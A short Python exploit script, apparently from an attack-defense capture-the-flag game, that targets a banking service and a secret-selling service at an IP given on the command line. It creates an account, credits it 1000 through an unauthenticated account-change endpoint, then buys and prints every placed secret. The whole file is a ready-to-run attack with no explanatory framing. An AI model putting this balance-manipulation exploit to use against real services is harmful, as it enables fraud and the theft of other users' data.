import json
import sys
import requests

# Rationale: banking microservice is available on port 9000

ip = sys.argv[1] if len(sys.argv) > 1 else "localhost"
banking_url = f"http://{ip}:9000"
userapi_url = f"http://{ip}:9999"

account = "alagunto"

requests.post(banking_url + "/api/accounts/create", {
    "account": account
})

requests.post(banking_url + "/api/account/change", {
    "account": account,
    "change": 1000
})

latest = json.loads(requests.get(userapi_url + "/placed_secrets").text)["result"]["data"]

for each in latest:
    result = requests.post(userapi_url + "/buy_secret", {"account": account, "secret_id": each["id"]}).text
    print(json.loads(result)["result"]["secret"])

